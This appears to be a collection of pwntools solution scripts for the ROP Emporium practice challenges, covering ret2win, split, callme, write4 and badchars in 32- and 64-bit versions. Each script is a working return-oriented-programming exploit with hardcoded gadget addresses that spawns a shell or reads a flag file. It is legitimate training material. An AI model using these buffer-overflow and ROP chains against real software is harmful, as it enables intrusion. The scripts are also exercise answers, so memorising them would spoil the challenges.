## ROP Emporium solutions
https://ropemporium.com/

### ret2win

Change the function return address.

32-bit

```python
from pwn import *

elf = ELF('./ret2win32')
io = gdb.debug('./ret2win32', 'b main')
io.sendline(cyclic(44) + p32(elf.sym['ret2win']))
io.interactive()
```

64-bit

```python
from pwn import *

elf = ELF('./ret2win')
io = process('./ret2win')
io = gdb.debug('./ret2win', 'b*pwnme+109')
io.sendline(cyclic(40) + p64(0x40053e) + p64(elf.sym['ret2win']))
io.interactive()
```

### split

Call `system()` with `cat flag.txt`

32-bit

```python
from pwn import *

# rabin2 -z split32
# 000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt

# gdb
# usefulFunction address: 0x08048657

payload = b'A'*44 + p32(0x8048657) + p32(0x804a030)
io = process('./split32')
print(io.recvuntil('> '))
io.sendline(payload)
print(io.recv())
```

64-bit

```python
from pwn import *

# ROPgadget
# 0x0000000000400883 : pop rdi ; ret

# rabin2 -z
# 000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt

# address of usefulFunction: 0x400807
payload = b'A'*40 + p64(0x400883) + p64(0x601060) + p64(0x400810)

r = process('./split')
r.recvuntil('> ')
r.sendline(payload)
print(r.recv())
```

### callme

Call three different functions with three different arguments.

32-bit

```python
from pwn import *

# ROPgadget
# 0x08048576 : add esp, 8 ; pop ebx ; ret
# 0x080488a9 : pop esi ; pop edi ; pop ebp ; ret

payload = b'A'*44

# 0x080485c0  callme_one@plt
# 0x08048620  callme_two@plt
# 0x080485b0  callme_three@plt

payload += p32(0x080485c0) + p32(0x08048576) + p32(0x01) + p32(0x02) + p32(0x03)
payload += p32(0x08048620) + p32(0x08048576) + p32(0x01) + p32(0x02) + p32(0x03)
payload += p32(0x080485b0) + p32(0x08048576) + p32(0x01) + p32(0x02) + p32(0x03)

# io = gdb.debug('./callme32','b main')
io = process('./callme32')

print(io.recvuntil('> '))
io.sendline(payload)
print(io.recvall())
```

64-bit

```python
from pwn import *
payload = b'A'*40

# ROPgadget
# 0x401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
# 0x4017d9 : ret

# rabin2 -s
# callme_one: 0x401850
# callme_two: 0x401870
# callme_three: 0x401810

payload += p64(0x4017d9)
payload += p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401850)
payload += p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401870)
payload += p64(0x401ab0) + p64(1) + p64(2) + p64(3) + p64(0x401810)

# io = gdb.debug('./callme', 'b *0x401a56')
io = process('./callme')

io.recv()
io.sendline(payload)
io.interactive()
```

### write4

Write string to memory and pass it to `system()`

32-bit

```python
from pwn import *
io = process('./write432')

p = b'A'*44

####

p += p32(0x80486da) # pop edi ; pop ebp ; ret
p += p32(0x804a02c) # @ .data + 4
p += b'//sh'
p += p32(0x8048670) # mov dword ptr [edi], ebp ; ret

####

p += p32(0x80486da) # pop edi ; pop ebp ; ret
p += p32(0x804a028) # @ .data
p += b'/bin'
p += p32(0x8048670) # mov dword ptr [edi], ebp ; ret

####

p += p32(0x804865a) # system
p += p32(0x804a028) # @ .data

####

print(io.recv())
io.sendline(p)
io.interactive()
```

64-bit

```python
from pwn import *
io = process('./write4')

p = b'A'*40
p += p64(0x400890) # pop r14 ; pop r15 ; ret
p += p64(0x601050) # @ .data
p += b'/bin//sh'
p += p64(0x400820) # mov qword ptr [r14], r15 ; ret
p += p64(0x400893) # pop rdi ; ret
p += p64(0x601050) # @ .data
p += p64(0x400810) #4005e0) # @ system@plt

print(io.recv())
io.sendline(p)
io.interactive()
```

### badchars

Some characters are not allowed (xor to store data, xor to get it back while in memory).

64-bit

```python
from pwn import *

payload = b'A'*40 # offset
print_file  = p64(0x7ffff7dc7a07)
writeable   = 0x7ffff7ba5000

# write to memory
pop_r12_r13_r14_r15 = p64(0x40069c)
mov_r13_r12 = p64(0x400634)
pop_rdi     = p64(0x4006a3)

payload += pop_r12_r13_r14_r15 + b'flbh/tyt' + p64(writeable) + p64(1) + \
           p64(writeable+2) + mov_r13_r12 + pop_rdi + p64(writeable)


# introducing bad chars
pop_r15 = p64(0x4006a2)
sub_r15_r14 = p64(0x400630)

payload += sub_r15_r14
payload += pop_r15 + p64(writeable+3) + sub_r15_r14
payload += pop_r15 + p64(writeable+4) + sub_r15_r14
payload += pop_r15 + p64(writeable+6) + sub_r15_r14

# print file contents
payload += print_file

# io = gdb.debug('./badchars', 'b *pwnme+268')
io = process('./badchars')
io.sendline(payload)
io.interactive()
```

32-bit

```python
from pwn import *

# 0x80485bb : pop ebp ; ret
# 0x804839d : pop ebx ; ret
# 0x8048543 : add BYTE PTR [ebp+0x0], bl

# offset for overflow
payload = b'A'*44

# write filename to memory
# 0x80485b9 : pop esi ; pop edi ; pop ebp ; ret
# 0x804854f : mov dword ptr [edi], esi ; ret

writeable = 0x804a032

# we can't store the "flag.txt" string on the stack
# because the stack is used by fopen and the string
# gets modified

payload += p32(0x80485b9) + b'ci^d' + p32(writeable) + b'BBBB' + p32(0x804854f)
payload += p32(0x80485b9) + b'+quq' + p32(writeable+4) + b'BBBB' + p32(0x804854f)

# xoring the filename in memory
for i in range(8):
    payload += p32(0x80485bb) + p32(writeable+i)
    payload += p32(0x804839d) + p32(3)
    payload += p32(0x8048543)

# reading and displaying file contents
print_file = 0xf7fc87cf
payload += p32(print_file) + b'BBBB' + p32(writeable)

# io = gdb.debug('./badchars32', 'b*pwnme+273')
# io = gdb.debug('./badchars32', 'b*print_file+38')
io = process('./badchars32')
io.sendline(payload)
io.interactive()
```
